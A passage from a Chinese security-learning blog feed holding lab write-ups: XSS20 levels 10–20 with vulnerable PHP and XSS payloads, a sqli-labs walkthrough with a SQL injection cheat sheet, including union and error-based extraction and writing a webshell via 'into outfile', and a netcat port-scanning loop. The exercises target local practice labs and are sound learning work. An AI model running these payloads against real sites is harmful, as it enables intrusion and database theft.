class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>原来如此，这里面需要有两个参数：<code>keyword和t_sort</code>但是后面没有用到keyword这个参数的地方，他把我们输入的<code>&lt;</code>和<code>&gt;</code>也全部替换为空了，所以标签基本都废了。但是下面有三个隐藏参数，需要get好几个选项，所以要用&amp;连接。我们把类型改为text。</p><p><code>abc&amp;bobosec&amp;t_sort=&quot;onclick=&quot;alert()&quot;type=&quot;text&quot;</code></p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less 11"></a>Less 11</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ref"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​    这一关多了HTTP_REFERER这是来自上一关的referer，所以要开始抓包改referer了</p><p>直接改referer就ok，如图：</p><p><img src="/2019/03/01/XSS20-Write-up/less11.1.jpg" alt=" "></p><p><img src="/2019/03/01/XSS20-Write-up/less11.2.jpg" alt=" "></p><p><code>abc&amp;bobosec&amp;t_sort=&quot;onclick=&quot;alert()&quot;type=&quot;text&quot;</code></p><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less 12"></a>Less 12</h2><p>后面难度越来越大，我们直接边看源码边分析吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ua"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这次要的不是referer了，变成user_agent了，还是抓包发送就好</p><p><img src="/2019/03/01/XSS20-Write-up/less12.jpg" alt=" "></p><p>在十一关成功的时候抓包，点确定，然后改user_agent为<code>abc&amp;bobosec&amp;t_sort=&quot;onclick=&quot;alert()&quot;type=&quot;text&quot;</code></p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less 13"></a>Less 13</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_cook"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这一关多了个cookies，所以我们直接抓包修改cookies即可，把cookies改成<code>abc&amp;bobosec&amp;t_sort=&quot;onclick=&quot;alert()&quot;type=&quot;text&quot;</code>就好了，和前几关一样的</p><h2 id="Less14"><a href="#Less14" class="headerlink" title="Less14"></a>Less14</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level14<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level14<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"leftframe"</span> <span class="attr">marginwidth</span>=<span class="string">10</span> <span class="attr">marginheight</span>=<span class="string">10</span> <span class="attr">src</span>=<span class="string">"http://www.exifviewer.org/"</span> <span class="attr">frameborder</span>=<span class="string">no</span> <span class="attr">width</span>=<span class="string">"80%"</span> <span class="attr">scrolling</span>=<span class="string">"no"</span> <span class="attr">height</span>=<span class="string">80%</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>这关成功后不会自动跳转。成功者<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">/xsschallenge/level15.php?src</span>=<span class="string">1.gif</span>&gt;</span>点我进level15<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这一关看着有点迷，源码里内嵌了一个iframe：<a href="http://www.exifviewer.org/" target="_blank" rel="noopener">http://www.exifviewer.org/</a></p><p>可是这个网站一直打不开，看了一下别的人WP说是要构造一个XSS图片，这里用到的工具是exiftools，有兴趣的dalao们可以试一下~，这是乌云2012年爆出来的DiscuzX2个人空间图片exif信息XSS。我们直接进Less 15</p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less 15"></a>Less 15</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"src"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里在最后php代码里可以看到一个ng-include文件包含，那么我就可以尝试让他包含某个可以执行xss漏洞的文件，然后让这个文件调用alert方法就可以了。</p><h3 id="ng-include"><a href="#ng-include" class="headerlink" title="ng-include"></a>ng-include</h3><ol><li><p>ng-include指令用于包含外部的 HTML 文件。</p></li><li><p>包含的内容将作为指定元素的子节点。</p></li><li><p><code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。</p></li><li><p>默认情况下，包含的文件需要包含在同一个域名下。</p></li></ol><p>这个只需要包含一个可以执行XSS的漏洞文件就可以，现成的就是第一关的，直接包含就好~</p><p><code>&#39;level1.php?name=bobosec&lt;img src=111 onerror=alert(1)&gt;&#39;</code></p><p>第十五关后面链接不对，应该是<code>http://localhost/XSS20/level15.php?src==1.gif</code></p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less 16"></a>Less 16</h2><p>终于来到个正常的关了。。14和15都好迷~</p><p>贴代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">""</span>,<span class="string">"&amp;nbsp;"</span>,$str4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以看到在这里新增过滤了空格，所以现在是<code>script ,空格 ,/,都转义了</code></p><p>绕过可以看一下HTML URL编码，参考这个文章：<a href="http://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="noopener">http://www.w3school.com.cn/tags/html_ref_urlencode.html</a></p><p><code>bobosec%3Cimg%0dsrc=1%0donerror=alert(1)%3E</code></p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less 17"></a>Less 17</h2><p>点击摄像机会弹出flash动画，捣鼓了好久发现没用啊、、只好看源码了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf01.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>有<code>&lt;embed&gt;</code>标签定义嵌入的内容，所以我们可以直接插入插件</p><p>发现这个和那个flash动画一点关系也没有、、、真的坑</p><p>这里直接给arg01和arg02随意赋值，让他写入到<code>&lt;embed&gt;</code>里<code>arg01=a&amp;arg02=bobosec%20onmouseenter=alert()</code></p><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less 18"></a>Less 18</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf02.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>感觉和上一关一样啊、、所以用上一关payload也过去了</p><h2 id="Less-19-amp-Less-20"><a href="#Less-19-amp-Less-20" class="headerlink" title="Less 19&amp;Less 20"></a>Less 19&amp;Less 20</h2><p>全是flash的xss。。小白的我真的不会了，有大佬会的求教~orz</p>]]></content>
    
    <summary type="html">
    
      XSS20 学习
    
    </summary>
    
      <category term="学习记录" scheme="http://bobosec.top/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="日益成长的小白" scheme="http://bobosec.top/tags/%E6%97%A5%E7%9B%8A%E6%88%90%E9%95%BF%E7%9A%84%E5%B0%8F%E7%99%BD/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs</title>
    <link href="http://bobosec.top/2019/02/26/sqli-labs/"/>
    <id>http://bobosec.top/2019/02/26/sqli-labs/</id>
    <published>2019-02-26T12:28:14.000Z</published>
    <updated>2019-02-28T13:35:17.425Z</updated>
    
    <content type="html"><![CDATA[<p>开始撸一波sqli-labs，加油~</p><h1 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h1><p>这里参考一下IV4N大佬的博客，整理的超级棒</p><h3 id="SCHEMATA表"><a href="#SCHEMATA表" class="headerlink" title="SCHEMATA表"></a><strong>SCHEMATA表</strong></h3><p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。</p><h3 id="TABLES表"><a href="#TABLES表" class="headerlink" title="TABLES表"></a><strong>TABLES表</strong></h3><p>储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表</p><h3 id="COLUMNS表"><a href="#COLUMNS表" class="headerlink" title="COLUMNS表"></a><strong>COLUMNS表</strong></h3><p>提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是show  columns from schemaname.tablename的结果取之此表</p><p>version()——MySQL 版本</p><p>user()——数据库用户名</p><p>current_user——当前用户名</p><p>database()——数据库名</p><p>@@datadir——数据库路径</p><p>@@version_compile_os——操作系统版本</p><p>into outfile——写入文件，<code>select &#39;一句话木马&#39; into outfile &quot;/var/www/html/test.php&quot;</code></p><p>数据库插入语句：<code>insert into [table] values(a,b,c);</code></p><p>删除语句：<code>delete from [table] where id=1;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database [datebase];`，`drop table [table];`，`alter table [table] drop column [column];</span><br></pre></td></tr></table></figure><p>修改：<code>update [table] set [column] = &#39;abc&#39; where id =1;</code></p><p>concat(str1,str2,…)——无分隔符地连接字符串</p><p>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</p><p>group_concat(group SEPARATOR ‘;’ )——连接一组字符串，后可加GROUP BY</p><p>extractvalue() 从xml中提取数据</p><p><strong>盲注</strong></p><p>length()</p><p>mid(str,n,m) 从str的第n个数开始提取m个 //与vb的mid()函数相同</p><p>substr(str,n,m) 从str的第n个数开始提取m个</p><p>left(str,n) 从左开始提取n个 //与vb的left()函数相同</p><p>ord() 字符=&gt;ascii //与python的ord()函数相同</p><p>ascii() 同ord()</p><p><strong>Time-Based</strong></p><p>BENCHMARK(count,func())</p><p>sleep()</p><p>if(a,t,f) //同a?t:f</p><p><strong>Wrong-Based</strong></p><p>使用group by对rand()函数操作时会返回duplicate key error</p><p>rand(int) //以int为种子生成伪随机数</p><p>floor() //向下取整</p><p>count() //统计个数</p><ul><li>and extractvalue(1, concat(0x25, (select table_name from information_schema.tables limit 1)));</li><li>and 1=(updatexml(1,concat(0x25,(select user())),1))</li><li>and(select 1 from(select count(<em>),concat((select (select (select concat(0x25,(select username from users where id=1),0x25))) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)#</li><li>and select <em> from(select </em> from table a join table b)as c</li></ul><p><strong>正则注入</strong></p><p>Mysql中的RE和大多数编程语言中的相同，不赘述</p><p><code>select user() regexp &#39;^[a-z]&#39;</code> 正确时返回1，错误返回0</p><p><code>select * from * where id =1 and 1=(user() regexp &#39;^[a-z]{4}&#39;)</code> </p><p>regexp可替换为like</p><p><strong>操作文件</strong></p><p><code>and (select count(*) from mysql.user)&gt;0</code> //返回正常说明有读取权限</p><p><code>select * INTO OUTFILE &#39;file_name&#39;</code> //写入文件，文件不能存在</p><p>爆数据库 <code>select schema_name from information_schema.schemata</code></p><p>爆某库的数据表 <code>select table_name from information_schema.tables where table_schema=’xxxxx’</code></p><p>爆某表的所有列 <code>select column_name from information_schema.columns where table_name=’xxxxx’</code></p><p>获取某列的内容 <code>select xx_column from xx_table</code></p><p>列出所有的数据库 <code>select group_concat(schema_name) from information_schema.schemata</code></p><p>列出某个库当中所有的表 <code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;xxxxx&#39;</code></p><p>系统数据库——information_schema，包含所有数据库相关信息</p><p>information_schema.schemata中schema_name列，字段为所有库名</p><p>information_schema.tables中table_name列对应数据库所有表名，与table_schema列对应</p><p>information_schema.columns同理，column_name与table_schema和table_name对应</p><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less 1"></a>Less 1</h2><p>这一关先测试一下属于字符型注入</p><p><code>?id=1&#39;and &#39;1&#39;=&#39;1</code>回显正常，<code>?id=1&#39;and &#39;1&#39;=&#39;2</code>报错，确定是字符型注入。</p><p>使用order by排序试得有3行。继续用联合注入<code>union select 1,2,3--+</code>发现在2和3位置有回显，所以要在2，3两个位置注入和查询。</p><p>先查数据库和数据库版本<code>?id=-1&#39;union select 1,database(),version()--+</code>发现显示出来了当前数据库和版本。</p><p> 列所有数据库:<code>http://localhost/sqli-labs-master/Less-1/?id=-1%27%20union%20select%201,group_concat(schema_name),concat(%27;%27,schema_name)%20from%20information_schema.schemata--+</code></p><p>列数据库当前表:<code>http://localhost/sqli-labs-master/Less-1/?id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_name= &#39;security&#39;--+</code></p><p>为了方便练习，自己加了个flag数据库还有fl4g的表，以后爆出fl4g数据即可</p><p>爆flag数据库的表：<code>http://localhost/sqli-labs-master/Less-1/?id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;flag&#39;--+</code></p><p>爆fl4g这个表的列：<code>http://localhost/sqli-labs-master/Less-1/?id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;fl4g&#39;--+</code></p><h2 id="Less-2-基于错误的GET整型注入"><a href="#Less-2-基于错误的GET整型注入" class="headerlink" title="Less 2 (基于错误的GET整型注入)"></a>Less 2 (基于错误的GET整型注入)</h2><p>第二关还是手动输入单引号测试，发现报错，单引号影响了闭合，所以这个可能不是字符型注入。</p><p><code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,2,3--+</code>测试发现在2，3有回显，所以和第一关一样依次查询就好。</p><p>爆当前数据库和版本：<code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,database(),version()--+</code></p><p>查询所有数据库：<code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p><p>查flag数据库的表：<code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;flag&#39;</code></p><p>查fl4g表的字段<code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;fl4g&#39;--+</code></p><h2 id="Less-3-基于错误的GET单引号变形字符型注入"><a href="#Less-3-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less 3(基于错误的GET单引号变形字符型注入)"></a>Less 3(基于错误的GET单引号变形字符型注入)</h2><p>输入单引号测试发现报错是：<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;-1&#39;&#39;) LIMIT 0,1&#39; at line 1</code></p><p>发现多了个括号，于是把括号闭合一下就可以了，后台应该是把输入的id写成<code>(&#39;$id&#39;)</code>这样了</p><p>测试发现<code>http://localhost/sqli-labs-master/Less-3/?id=-1%27%20)%20union%20select%201,2,3--+</code>在2，3位有回显所以和前两关差不多依次爆数据库，爆表，爆列，字段</p><p>列所有数据库：<code>http://localhost/sqli-labs-master/Less-3/?id=-1&#39; ) union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p><p>这里不一一赘述了，直接给出后面payload</p><p><code>http://localhost/sqli-labs-master/Less-3/?id=-1&#39; ) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;fl4g&#39;--+</code></p><h2 id="Less-4-基于错误的GET双引号字符型注入"><a href="#Less-4-基于错误的GET双引号字符型注入" class="headerlink" title="Less 4(基于错误的GET双引号字符型注入)"></a>Less 4(基于错误的GET双引号字符型注入)</h2><p>通过单引号测试发现没有异常，于是双引号测试一下，发现报错</p><p><img src="/2019/02/26/sqli-labs/less4-1.jpg" alt=" "></p><p>sql后台可能是(“$id”)这样写的，于是把双引号和反括号都闭合一下就好。</p><p>还是在2，3位置有回显，于是继续用联合查询，列出所有数据库。</p><p>payload：<code>http://localhost/sqli-labs-master/Less-4/?id=-1&quot;) union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p><p>在后台查询的语句其实是：<code>SELECT * FROM users WHERE id=(&quot;-1&quot;) union select 1,group_concat(schema_name),3 from information_schema.schemata-- &quot;) LIMIT 0,1</code>可以看到双引号和括号都闭合了。</p><p>继续爆表，依次进行。。。</p><p><code>http://localhost/sqli-labs-master/Less-4/?id=-1&quot; ) union select 1,group_concat(column_name),3 from information_schema.columns where table_name =&#39;fl4g&#39;--+</code></p><h2 id="Less-5-双注入GET单引号字符型注入"><a href="#Less-5-双注入GET单引号字符型注入" class="headerlink" title="Less 5(双注入GET单引号字符型注入)"></a>Less 5(双注入GET单引号字符型注入)</h2><p>这一关是双注入，不过貌似也有人当盲注做出来了or2</p><p>双注入解释起来有点复杂，所以看一下这个<a href="https://www.2cto.com/article/201303/192718.html" target="_blank" rel="noopener">文章</a></p>]]></content>
    
    <summary type="html">
    
      sqli-labs学习
    
    </summary>
    
      <category term="学习记录" scheme="http://bobosec.top/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="日益成长的小白" scheme="http://bobosec.top/tags/%E6%97%A5%E7%9B%8A%E6%88%90%E9%95%BF%E7%9A%84%E5%B0%8F%E7%99%BD/"/>
    
  </entry>
  
  <entry>
    <title>Kali Linux 渗透学习记录</title>
    <link href="http://bobosec.top/2019/01/18/kali-linux-study/"/>
    <id>http://bobosec.top/2019/01/18/kali-linux-study/</id>
    <published>2019-01-18T13:03:25.000Z</published>
    <updated>2019-01-19T04:34:16.061Z</updated>
    
    <content type="html"><![CDATA[<p>这个假期准备学一下linux的渗透，一步一步慢慢来吧~</p><h2 id="一些小工具"><a href="#一些小工具" class="headerlink" title="一些小工具"></a>一些小工具</h2><p>在kali里面自带了无数小工具用来渗透，在这里列举一下</p><ol><li>namp （用于扫描）但是namp扫描有很大噪音，会被记录，小心利用。</li><li>wafw00f （这个是用来识别web防火墙）</li></ol><h2 id="使用netcat编写自己的端口扫描器"><a href="#使用netcat编写自己的端口扫描器" class="headerlink" title="使用netcat编写自己的端口扫描器"></a>使用netcat编写自己的端口扫描器</h2><p>命令：<code>while read r; do nc -v -z $r 1-65535; done &lt;iplist</code></p><p>这里需要自己准备一下iplist这个文件。这个是查看和扫描目标开放端口的。</p><p>相同的脚本还可以修改为在单个IP上攻击多个目标。</p><p>代码：<code>while read  r; do nc -v -z target $r; done &lt; ports</code></p><p>在使用自定义端口扫描器的时候，会容易被警报。。。</p>]]></content>
    
    <summary type="html">
    
      立个flag，2019寒假学习完linux kali的渗透
    
    </summary>
    
      <category term="学习记录" scheme="http://bobosec.top/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="日积月累" scheme="http://bobosec.top/tags/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF/"/>
    
  </entry>
  
  <entry>
    <title>ctf-python一些技巧</title>
    <link href="http://bobosec.top/2018/12/23/ctf-python/"/>
    <id>http://bobosec.top/2018/12/23/ctf-python/</id>
    <published>2018-12-23T07:18:43.000Z</published>
    <updated>2018-12-23T12:55:08.228Z</updated>
    
